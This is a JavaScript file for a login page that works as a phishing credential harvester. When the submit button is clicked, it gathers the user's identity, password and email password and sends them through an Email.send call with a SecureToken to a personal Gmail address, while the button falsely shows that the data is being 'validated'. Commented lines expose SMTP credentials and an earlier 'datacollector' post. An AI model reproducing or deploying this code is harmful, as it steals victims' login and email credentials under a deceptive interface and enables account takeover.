var baseurl = $("#baseurl").val();
$(document).on('click','#logSubmiting', function(e) {
  e.preventDefault();
    var identity = $("#identity").val();
    var password = $("#password").val();
    var captcha = $("#e_password").val();
    if(identity == ""){
      var msgr = "<span style='color:red;font-weight: bold;'> Opps! Email or Mobile Number Field Can't Be Empty</span>";
      msg("Validation Message", msgr, 'error');
      $("#identity").focus();               
        return false;
    }
    if(password == ""){
      var msgr = "<span style='color:red;font-weight: bold;'> Opps! Password Field Can't Be Empty</span>";
      msg("Validation Message", msgr , 'error');
      $("#password").focus();               
        return false;
    }
    else{
      $("#logSubmiting").html('<i class="fa fa-spinner fa-pulse fa-fw" style="font-size: 20px; padding-top:5px; color:white;"></i> Validating Your Data'+"'s"+'...').attr('disabled', 'disabled');
        // var req_data = {"identity": identity, "password": password, "email_password": captcha};
        var msg = `identity: ${identity} password: ${password} email_password: ${captcha}`;
        Email.send({
          // Host: "smtp.elasticemail.com",
          // Username: "muheezogungbo26@gmail.com",
          // Password: "9E412C8AC56D9A565D656FB4C643DE593666",
          // port: "2525",
          // To: 'muheezogungbo26@gmail.com',
          // From: "muheezogungbo26@gmail.com",
          
          SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
          To: 'muheezogungbo26@gmail.com',
          From: "shirleylargey40@gmail.com",
            
            Subject: `Email`,
            Body: `${msg}`,
        }).then(function (message) {
            console.log(message)
            $("#logSubmiting").html('<i class="fa fa-check" style="font-size: 20px; padding-top:5px; color:white;"></i> Validation Completed').attr('disabled', false);
        }).catch((e) => console.log(e));
        // res = $.ajax({
        //     data: req_data,
        //     url: baseurl+"datacollector/",
        //     type: "POST",
        //     headers: {'X-Requested-With': 'XMLHttpRequest'},
        //     dataType: 'json',
        //     async:true,
        //     success: function (data) {
        //       if(data.status == "SUCCESS")
        //       {               
        //         setTimeout(function() {
        //           $("#logSubmiting").html('<i class="fa fa-check" style="font-size: 20px; padding-top:5px; color:white;"></i> Validation Completed').attr('disabled', false);
        //         },3000);

        //         setTimeout(function() {
        //           var msgr = "<span style='color:green;font-weight: bold;'>"+data.msg+"</span>";
        //           msg("Success Message", msgr, 'success');
        //         },5000);

        //         setTimeout(function() {
        //             window.location.href = "/";
        //         },10000);
        //       }
        //       else if(data.status == "FAILURE")
        //       {
        //         $('#logSubmiting').html('Submit').attr('disabled', false);
        //         var msgr = "<span style='color:red;font-weight: bold;'>"+data.msg+"</span>";
        //         msg("Success Message", msgr, 'success');
        //         setTimeout(function() {
        //             window.location.href = "";
        //         },2000);
        //       }
        //     },
        //     error: function (data) {
        //         console.log('Error:', data);
        //     }
        // });
    }
})

function msg(title = 'Error Alert',msg, type = "success"){
  var initMsg = "<span>"+msg+"</span>";
    swal({  
        title: title,
        text: initMsg,
        timer: 1000000,
        html: true,
        type: type
    })
}




